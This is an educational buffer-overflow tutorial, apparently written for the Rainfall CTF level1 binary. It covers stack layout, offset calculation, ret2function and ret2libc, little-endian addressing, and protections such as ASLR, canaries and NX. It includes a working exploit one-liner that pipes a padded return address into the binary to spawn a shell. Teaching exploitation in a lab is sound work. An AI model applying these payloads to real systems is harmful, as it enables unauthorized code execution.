# Buffer Overflow 101

A buffer is a chunk of memory reserved for storing data. In C:

```c
char buffer[64];  // 64 bytes reserved on the stack
```

The stack is where local variables live. It grows downward in memory, and has a specific layout when a function is called:

```
High addresses
┌──────────────────┐
│  arguments       │  ← passed by the caller
├──────────────────┤
│  return address  │  ← where to jump when function ends (4 bytes on 32-bit)
├──────────────────┤
│  saved EBP       │  ← previous frame pointer (4 bytes)
├──────────────────┤
│                  │
│  local variables │  ← your buffer lives here
│  (buffer)        │
│                  │
├──────────────────┤
│  ...             │
└──────────────────┘
Low addresses
```

## The overflow

When you write more data into a buffer than it can hold, the extra bytes spill into adjacent memory, overwriting whatever is next on the stack.

```c
char buffer[64];
gets(buffer);     // reads input with NO size limit
```

If you type 64 characters: everything fits in the buffer. Normal. If you type 100 characters: the first 64 fill the buffer, the rest overwrite saved EBP and the return address.

## Why is the return address important?

When a function ends (`ret` instruction), the CPU reads the return address from the stack and jumps to it. Normally this is the address of the next instruction in the caller.

```
main() calls function()
  → function() does its work
  → function() hits `ret`
  → CPU reads return address from stack
  → jumps back to main()
```

If we overwrite the return address with a different value, the CPU jumps somewhere else, wherever we tell it to.

## How to exploit it

### Step 1: Find the offset

Find how many bytes to write before reaching the return address.

From the assembly:
```asm
sub    $0x50,%esp         ; allocates 80 bytes on stack
lea    0x10(%esp),%eax    ; buffer starts at offset 16
```

Buffer size: 80 - 16 = 64 bytes. Then: padding + saved EBP = 12 bytes. Total to return address: 76 bytes.

Verify by sending 76 A's + "BBBB":
```
(gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
0x42424242 in ?? ()    ← EIP is "BBBB", offset confirmed
```

0x42 is the ASCII code for 'B'. If EIP = 0x42424242, it means the 4 bytes after our 76 A's landed exactly on the return address.

### Step 2: Choose where to jump

Options for the replacement address:

**a) ret2function**: jump to an existing function in the binary
   - Example: a `run()` function that calls `system("/bin/sh")`
   - Find its address: `(gdb) p run` → 0x08048444
   - Simplest technique, but requires a useful function to exist

**b) ret2libc**: jump to a libc function
   - libc is always loaded in memory and contains `system()`
   - Build a fake call: system("/bin/sh")
   - Need 3 addresses: system(), exit(), and "/bin/sh" string
   - Works when NX is enabled (can't execute code on stack)

**c) shellcode**: write executable code on the stack and jump to it
   - Only works when NX is disabled (stack is executable)
   - Place machine code that spawns a shell, jump to the buffer address

### Step 3: Build the payload

For ret2function (level1's case):

```
[76 bytes of 'A'] + [address of run() in little-endian]
```

For ret2libc:

```
[76 bytes of 'A'] + [system()] + [exit()] + ["/bin/sh" addr]
```

The layout after system() mirrors a normal function call:
```
[system addr]    ← CPU jumps here (like calling system())
[exit addr]      ← system() will "return" here when done
["/bin/sh" addr] ← first argument to system()
```

### Step 4: Deal with little-endian

x86 stores bytes in reverse order (least significant byte first).

Address: 0x08048444

In memory: \x44 \x84 \x04 \x08

```
Hex:    08  04  84  44
Memory: 44  84  04  08
        ↑ stored first (lowest address)
```

### Step 5: Run the exploit

```bash
(python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
```

Why `; cat`? The exploit is sent via a pipe. Once python finishes, the pipe closes and stdin ends. The `; cat` keeps stdin open so we can type commands in the shell that gets spawned.

## Dangerous C functions

These functions don't check input size; they're common overflow vectors:

| Function | Safe alternative |
|----------|-----------------|
| `gets()` | `fgets()` |
| `strcpy()` | `strncpy()` |
| `strcat()` | `strncat()` |
| `sprintf()` | `snprintf()` |
| `scanf("%s")` | `scanf("%64s")` with width |

## Protections (and why they're off here)

| Protection | What it prevents | Status in Rainfall |
|---|---|---|
| ASLR | Randomizes addresses so you can't predict where things are | Off |
| Stack canary | Detects overwrites before ret by checking a random value | Off |
| NX | Makes the stack non-executable (blocks shellcode) | On |
| PIE | Randomizes the binary's base address | Off |
| RELRO | Makes GOT read-only (blocks GOT overwrites) | Off |

With only NX enabled, shellcode on the stack won't run, but everything else is possible: predict all addresses (ASLR off), overwrite return address undetected (no canary), use fixed binary addresses (no PIE), overwrite GOT entries (no RELRO).

## Summary

```
1. Find a buffer with no bounds checking (gets, strcpy, etc.)
2. Calculate the offset from buffer to return address
3. Verify with a test pattern (BBBB → 0x42424242)
4. Choose a target: existing function, libc function, or shellcode
5. Build payload: [padding] + [target address in little-endian]
6. Send it: (python -c "print(payload)"; cat) | ./binary
```
